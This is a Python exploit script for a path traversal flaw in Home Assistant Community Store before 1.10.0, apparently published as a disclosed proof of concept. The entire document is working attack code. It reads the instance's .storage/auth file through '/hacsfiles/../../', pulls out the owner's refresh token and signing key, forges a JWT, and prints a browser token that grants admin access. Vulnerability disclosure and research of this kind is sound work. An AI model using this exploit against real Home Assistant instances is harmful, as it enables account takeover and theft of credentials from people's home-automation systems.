# Exploit Title: Home Assistant Community Store (HACS) 1.10.0 - Path Traversal to Account Takeover
# Date: 2021-01-28
# Exploit Author: Lyghtnox
# Vendor Homepage: https://www.home-assistant.io/
# Software Link: https://github.com/hacs/integration
# Version: < 1.10.0
# Tested on: Raspbian + Home Assistant 2021.1.0
# Blog post: https://lyghtnox.gitlab.io/posts/hacs-exploit/

# STEP 1: Run the exploit (python3 exploit.py host port)
# STEP 2: Copy the token printed and set in your browser's local storage with
# the key `hassTokens`

import requests
import jwt
import json
import argparse


class HA:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def retrieveFile(self, f):
        url = f'http://{self.ip}:{self.port}/hacsfiles/../../{f}'
        with requests.Session() as s:
            r = requests.Request(method='GET', url=url)
            prep = r.prepare()
            prep.url = url
            try:
                r = s.send(prep, verify=False)
            except requests.exceptions.ConnectionError:
                return
        if r.status_code == 400 or r.status_code == 404:
            return
        return r

    def craftToken(self):
        f = self.retrieveFile('.storage/auth').json()

        # Find owner
        for user in f['data']['users']:
            if user['is_owner']:
                self.owner = user['id']
                break
        else:
            print("No owner found. Using first account")
            self.owner = f['data']['users'][0]['id']

        for token in f['data']['refresh_tokens']:
            if self.owner == token['user_id']:
                encoded_jwt = jwt.encode({'iss': token['id']},
                                         token['jwt_key'],
                                         algorithm="HS256")
                self.token = {'access_token': encoded_jwt,
                              'token_type': 'Bearer',
                              'refresh_token': token['token'],
                              'expires_in': 1800,
                              'hassUrl': f"http://{self.ip}:{self.port}",
                              'clientId': token['client_id']}
                return self.token


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit a vulnerability in \
HACS < 1.10.0 to gain admin access to an Home Assistant instance.")
    parser.add_argument("host", type=str, help="IP of the HASS instance")
    parser.add_argument("port", type=int, help="port of the HASS instance")
    args = parser.parse_args()

    r = requests.get('http://{ip}:{port}/hacsfiles/iconset.js'.format(
        ip=args.host,
        port=args.port))
    if r.status_code != 404:
        print("HACS found! Testing vulnerability...", end='', flush=True)
        ha = HA(args.host, args.port)
        if ha.retrieveFile('configuration.yaml'):
            print(": VULNERABLE")
            token = ha.craftToken()
            if token:
                print(f"Use the following 'hassTokens': {json.dumps(token)}")
            else:
                print("Unable to craft token")
        else:
            print(": Not vulnerable")